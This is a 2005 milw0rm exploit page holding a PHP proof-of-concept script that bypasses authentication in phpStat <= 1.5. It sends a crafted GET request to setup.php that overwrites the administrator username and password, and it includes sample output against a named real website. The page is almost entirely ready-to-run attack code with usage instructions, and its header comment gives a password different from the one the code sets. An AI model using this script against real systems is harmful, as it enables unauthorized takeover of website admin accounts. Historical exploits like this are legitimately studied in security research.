<html>
<head>
<title>phpStat <= 1.5 (setup.php) Authentication Bypass Exploit (php 2)</title>
<pre>
&lt;?

/*

**************************************************************
PHP Stat Administrative User Authentication Bypass POC Exploit
     Code by Nikyt0x - Soulblack Security Research
**************************************************************

Advisory: 
 http://www.soulblack.com.ar/repo/papers/phpstat_advisory.txt

Saludos:                                        
   Soulblack Staff, Status-x, NeosecurityTeam,
   KingMetal, SWP, Trespasser...

nikyt0x@gmail.com
http://www.nikyt0x.tk

**************************************************************
**This Exploit Change Admin Username and Password
**Username: admin
**Password: admin
**************************************************************


php sbphpstatpoc.php www.spazfarm.com /spazstats/setup.php

          ==============================================================
          PHP Stat Administrative User Authentication Bypass POC Exploit
          ==============================================================
                     by Nikyt0x - Soulblack Security Research

     [+] Testing: www.spazfarm.com
     [+] Socket
     [+] Sending Exploit
     [+] OK

     Open www.spazfarm.com/spazstats/setup.php

     Username: admin
     Password: 123456

**************************************************************
*/

// username and password

$username = &quot;admin&quot;;
$password = &quot;123456&quot;;

function sh0w()
{
echo &quot;\n          ==============================================================\n&quot;;
echo &quot;          PHP Stat Administrative User Authentication Bypass POC Exploit\n&quot;;
echo &quot;          ==============================================================\n&quot;;
echo &quot;                     by Nikyt0x - Soulblack Security Research\n\n&quot;;
}

if ($argc != 3)
{
sh0w();
echo &quot;\n\n          Usage:\n                   sbphpstatpoc.php www.site.com /dir/to/setup.php\n&quot;;
exit();
}


if(!ereg('setup.php',$argv[2])) {
   echo &quot;URL to setup.php Incorrect.\n&quot;;
   exit(0);
}

sh0w();

echo &quot;     [+] Testing: $argv[1]\n&quot;;

$s0ck3t = fsockopen($argv[1], 80);

if (!$s0ck3t) {
   echo &quot;     [-] Socket\n&quot;;
   exit(0);
} else {

    $petici0n  = &quot;GET $argv[2]?check=yes&amp;username=$username&amp;password=$password HTTP/1.1\r\n&quot;;
    $petici0n .= &quot;Host: $argv[1]\r\n&quot;;
    $petici0n .= &quot;Connection: Close\r\n\r\n&quot;;
   
   echo &quot;     [+] Socket\n&quot;;

if(!fwrite($s0ck3t, $petici0n))
   {
   echo &quot;     [-] Sending Exploit\n&quot;;
   exit(0);
   }
echo &quot;     [+] Sending Exploit\n&quot;;

 while (!feof($s0ck3t)) {
       $g3tdata = fgets($s0ck3t, 1024);
	   if (eregi('Setup has been updated',$g3tdata))
	   {
	   echo &quot;     [+] OK\n\n&quot;;
           echo &quot;     Open $argv[1]$argv[2]\n\n     Username: $username\n     Password: $password\n&quot;;
           exit();
           }

}
fclose($s0ck3t);
}

?&gt;

# milw0rm.com [2005-05-30]
</pre>
</html>

